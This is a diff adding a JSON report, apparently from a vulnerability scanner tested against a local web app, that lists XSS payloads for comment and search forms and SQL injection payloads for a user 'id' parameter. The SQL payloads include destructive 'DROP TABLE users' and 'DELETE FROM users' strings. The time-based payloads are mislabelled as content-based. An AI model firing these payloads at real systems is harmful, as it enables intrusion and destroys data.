@@ -1,0 +1,94 @@
+[
+  {
+    "url": "http://127.0.0.1:5000/comment",
+    "xss": [
+      {
+        "form": {
+          "action": "http://127.0.0.1:5000/comment",
+          "method": "post",
+          "inputs": [
+            "name"
+          ]
+        },
+        "payloads": [
+          "<script>alert('XSS')</script>",
+          "<img src=x onerror=alert('XSS')>",
+          "<svg/onload=alert('XSS')>",
+          "\"><script>alert(String.fromCharCode(88,83,83))</script>",
+          "<iframe src=javascript:alert('XSS')>",
+          "<body onload=alert('XSS')>"
+        ]
+      }
+    ],
+    "sqli": false
+  },
+  {
+    "url": "http://127.0.0.1:5000/user?id=1",
+    "xss": [],
+    "sqli": [
+      {
+        "type": "SQL Injection",
+        "url": "http://127.0.0.1:5000/user",
+        "parameter": "id",
+        "payloads_by_type": {
+          "Content-based SQLi": [
+            "' AND SLEEP(3)--",
+            "' AND BENCHMARK(5000000,MD5('test'))--",
+            "1' AND SLEEP(2)--",
+            "'; WAITFOR DELAY '0:0:3'--",
+            "1'; WAITFOR DELAY '0:0:2'--",
+            "'; DROP TABLE users--",
+            "'; DELETE FROM users--",
+            "'#"
+          ]
+        }
+      }
+    ]
+  },
+  {
+    "url": "http://127.0.0.1:5000",
+    "xss": [
+      {
+        "form": {
+          "action": "http://127.0.0.1:5000",
+          "method": "get",
+          "inputs": [
+            "search"
+          ]
+        },
+        "payloads": [
+          "<script>alert('XSS')</script>",
+          "<img src=x onerror=alert('XSS')>",
+          "<svg/onload=alert('XSS')>",
+          "\"><script>alert(String.fromCharCode(88,83,83))</script>",
+          "<iframe src=javascript:alert('XSS')>",
+          "<body onload=alert('XSS')>"
+        ]
+      }
+    ],
+    "sqli": false
+  },
+  {
+    "url": "http://127.0.0.1:5000/",
+    "xss": [
+      {
+        "form": {
+          "action": "http://127.0.0.1:5000/",
+          "method": "get",
+          "inputs": [
+            "search"
+          ]
+        },
+        "payloads": [
+          "<script>alert('XSS')</script>",
+          "<img src=x onerror=alert('XSS')>",
+          "<svg/onload=alert('XSS')>",
+          "\"><script>alert(String.fromCharCode(88,83,83))</script>",
+          "<iframe src=javascript:alert('XSS')>",
+          "<body onload=alert('XSS')>"
+        ]
+      }
+    ],
+    "sqli": false
+  }
+]
